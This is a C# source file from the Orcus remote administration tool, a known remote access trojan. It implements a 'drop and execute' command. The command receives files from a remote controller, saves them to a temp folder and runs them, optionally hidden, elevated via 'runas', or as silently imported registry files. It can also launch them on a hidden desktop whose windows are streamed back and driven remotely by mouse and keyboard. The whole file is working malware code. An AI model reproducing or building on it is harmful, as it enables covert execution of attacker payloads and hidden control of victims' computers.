using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using Orcus.Plugins;
using Orcus.Shared.Commands.DropAndExecute;
using Orcus.Shared.Commands.RemoteDesktop;
using Orcus.Shared.Data;
using Orcus.Shared.NetSerializer;
using Orcus.Utilities.WindowsDesktop;

namespace Orcus.Commands.DropAndExecute
{
    [DisallowMultipleThreads]
    public class DropAndExecuteCommand : Command
    {
        private List<TransferedFileInfo> _transferedFiles;
        private string _targetDirectory;
        private IApplicationWarder _applicationWarder;

        public override void Dispose()
        {
            base.Dispose();

            _applicationWarder?.StopExecution();
            _applicationWarder?.Dispose();

            if (_transferedFiles != null)
                foreach (var transferedFileInfo in _transferedFiles)
                    transferedFileInfo.Dispose();

            if (_targetDirectory != null)
                Directory.Delete(_targetDirectory, true);
        }

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((DropAndExecuteCommunication) parameter[0])
            {
                case DropAndExecuteCommunication.InitializeFileTransfer:
                    var transferedFile =
                        new TransferedFileInfo(Serializer.FastDeserialize<FileTransferInfo>(parameter, 1),
                            GetTargetDirectory());

                    if (_transferedFiles == null)
                        _transferedFiles = new List<TransferedFileInfo>();

                    _transferedFiles.Add(transferedFile);
                    break;
                case DropAndExecuteCommunication.SendPackage:
                    var fileGuid = new Guid(parameter.Skip(1).Take(16).ToArray());
                    transferedFile = _transferedFiles?.FirstOrDefault(x => x.Guid == fileGuid);

                    var result = transferedFile?.ReceiveData(parameter, 17, parameter.Length - 17);
                    if (result != null)
                    {
                        if (result == true)
                            ResponseBytes((byte) DropAndExecuteCommunication.ResponseUploadCompleted,
                                fileGuid.ToByteArray(), connectionInfo);
                        else
                            ResponseBytes((byte) DropAndExecuteCommunication.ResponseUploadFailed,
                                fileGuid.ToByteArray(), connectionInfo);
                    }
                    break;
                case DropAndExecuteCommunication.UploadCanceled:
                    fileGuid = new Guid(parameter.Skip(1).Take(16).ToArray());
                    transferedFile = _transferedFiles?.FirstOrDefault(x => x.Guid == fileGuid);

                    if (transferedFile != null)
                    {
                        transferedFile.Dispose();
                        _transferedFiles.Remove(transferedFile);
                    }
                    break;
                case DropAndExecuteCommunication.WindowAction:
                    var windowHandle = BitConverter.ToInt64(parameter, 1);
                    OnWindowAction((RemoteDesktopAction) parameter[9], parameter, 10, windowHandle);
                    break;
                case DropAndExecuteCommunication.StopExecution:
                    _applicationWarder.StopExecution();
                    _applicationWarder.Dispose();
                    _applicationWarder = null;
                    break;
                case DropAndExecuteCommunication.StopStreaming:
                    _applicationWarder.Dispose();
                    _applicationWarder = null;
                    break;
                case DropAndExecuteCommunication.SwitchUserToHiddenDesktop:
                    var hiddenApplicationWarder = _applicationWarder as HiddenDesktopApplicationManager;
                    if (hiddenApplicationWarder != null)
                    {
                        hiddenApplicationWarder.Desktop.Show();
                        ResponseByte((byte) DropAndExecuteCommunication.ResponseUserSwitched, connectionInfo);
                    }
                    break;
                case DropAndExecuteCommunication.SwitchUserBack:
                    var desktop = Desktop.Default;
                    desktop.Show();
                    ResponseByte((byte) DropAndExecuteCommunication.ResponseUserSwitched, connectionInfo);
                    break;
                case DropAndExecuteCommunication.ExecuteFile:
                    var options = Serializer.FastDeserialize<ExecuteOptions>(parameter, 1);
                    transferedFile = _transferedFiles.FirstOrDefault(x => x.Guid == options.FileGuid);
                    if (transferedFile == null)
                    {
                        ResponseByte((byte) DropAndExecuteCommunication.ResponseFileNotFound, connectionInfo);
                        return;
                    }

                    switch (options.ExecutionMode)
                    {
                        case ExecutionMode.JustExecute:
                            var processInfo = new ProcessStartInfo(transferedFile.FileName)
                            {
                                Arguments = options.Arguments
                            };
                            if (options.RunAsAdministrator)
                                processInfo.Verb = "runas";

                            var process = Process.Start(processInfo);
                            Thread.Sleep(1000);
                            if (process?.HasExited != false)
                            {
                                var exitCode = process?.ExitCode ?? 0;
                                ResponseBytes(
                                    (byte) DropAndExecuteCommunication.ResponseFileMightNotHaveExecutedSuccessfully,
                                    BitConverter.GetBytes(exitCode), connectionInfo);
                            }
                            else
                                ResponseByte((byte) DropAndExecuteCommunication.ResponseFileExecuted, connectionInfo);
                            return;
                        case ExecutionMode.ExecuteHidden:
                            processInfo = new ProcessStartInfo(transferedFile.FileName)
                            {
                                Arguments = options.Arguments,
                                CreateNoWindow = true,
                                UseShellExecute = false,
                                WindowStyle = ProcessWindowStyle.Hidden
                            };

                            if (transferedFile.FileName.EndsWith("reg", StringComparison.OrdinalIgnoreCase))
                            {
                                processInfo.FileName = "regedit.exe";
                                processInfo.Arguments = $"/s \"{transferedFile.FileName}\"";
                            }

                            if (options.RunAsAdministrator)
                                processInfo.Verb = "runas";

                            process = Process.Start(processInfo);
                            Thread.Sleep(1000);
                            if (process?.HasExited != false)
                            {
                                var exitCode = process?.ExitCode ?? 0;
                                ResponseBytes(
                                    (byte) DropAndExecuteCommunication.ResponseFileMightNotHaveExecutedSuccessfully,
                                    BitConverter.GetBytes(exitCode), connectionInfo);
                            }
                            else
                                ResponseByte((byte) DropAndExecuteCommunication.ResponseFileExecuted, connectionInfo);
                            return;
                        case ExecutionMode.ExecuteAndCapture:
                            return;
                        case ExecutionMode.ExecuteInSecondDesktopAndCapture:
                            _applicationWarder = new HiddenDesktopApplicationManager();
                            break;
                        default:
                            throw new ArgumentOutOfRangeException();
                    }

                    try
                    {
                        _applicationWarder.OpenApplication(transferedFile.FileName, options.Arguments,
                            options.RunAsAdministrator);
                    }
                    catch (Exception)
                    {
                        ResponseByte(
                            (byte) DropAndExecuteCommunication.ResponseFileExecutionFailed,
                            connectionInfo);
                        _applicationWarder.Dispose();
                        _applicationWarder = null;
                        return;
                    }

                    IDataInfo firstRenderInfo = null;
                    WindowUpdate windowUpdate = null;

                    for (int i = 0; i < 5; i++)
                    {
                        try
                        {
                            windowUpdate = _applicationWarder.GetWindowUpdate(0, out firstRenderInfo);
                        }
                        catch (Exception)
                        {
                            // ignored
                        }

                        if (windowUpdate != null)
                            break;

                        Thread.Sleep(1000);
                    }
                    
                    var windowUpdateData = Serializer.FastSerialize(windowUpdate);

                    connectionInfo.UnsafeResponse(this, firstRenderInfo.Length + windowUpdateData.Length + 4 + 1,
                        writer =>
                        {
                            writer.Write((byte) DropAndExecuteCommunication.ResponseBeginStreaming);
                            writer.Write(windowUpdateData.Length);
                            writer.Write(windowUpdateData);
                            firstRenderInfo.WriteIntoStream(writer.BaseStream);
                        });
                    break;
                case DropAndExecuteCommunication.GetWindowUpdate:
                    if (_applicationWarder == null)
                        return;

                    IDataInfo renderInfo;
                    windowUpdate = _applicationWarder.GetWindowUpdate(BitConverter.ToInt64(parameter, 1), out renderInfo);

                    if (windowUpdate == null)
                    {
                        _applicationWarder.Dispose();
                        ResponseByte((byte) DropAndExecuteCommunication.ResponseStopStreaming, connectionInfo);
                        return;
                    }

                    windowUpdateData = Serializer.FastSerialize(windowUpdate);

                    connectionInfo.UnsafeResponse(this, (renderInfo?.Length ?? 0) + windowUpdateData.Length + 4 + 1,
                        writer =>
                        {
                            writer.Write((byte) DropAndExecuteCommunication.ResponseWindowUpdate);
                            writer.Write(windowUpdateData.Length);
                            writer.Write(windowUpdateData);
                            renderInfo?.WriteIntoStream(writer.BaseStream);
                        });
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private string GetTargetDirectory()
        {
            if (_targetDirectory == null)
            {
                _targetDirectory = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
                Directory.CreateDirectory(_targetDirectory);
            }

            return _targetDirectory;
        }

        private void OnWindowAction(RemoteDesktopAction remoteDesktopAction, byte[] data, int index, long windowHandle)
        {
            switch (remoteDesktopAction)
            {
                case RemoteDesktopAction.Mouse:
                    var x = BitConverter.ToInt32(data, index + 1);
                    var y = BitConverter.ToInt32(data, index + 5);
                    var extra = BitConverter.ToInt32(data, index + 9);
                    _applicationWarder.DoMouseAction((RemoteDesktopMouseAction) data[index], x, y, extra, windowHandle);
                    break;
                case RemoteDesktopAction.Keyboard:
                    var scanCode = BitConverter.ToInt16(data, index + 1);
                    _applicationWarder.DoKeyboardAction((RemoteDesktopKeyboardAction) data[index], scanCode,
                        windowHandle);
                    break;
                default:
                    throw new ArgumentOutOfRangeException(nameof(remoteDesktopAction), remoteDesktopAction, null);
            }
        }

        protected override uint GetId()
        {
            return 34;
        }
    }
}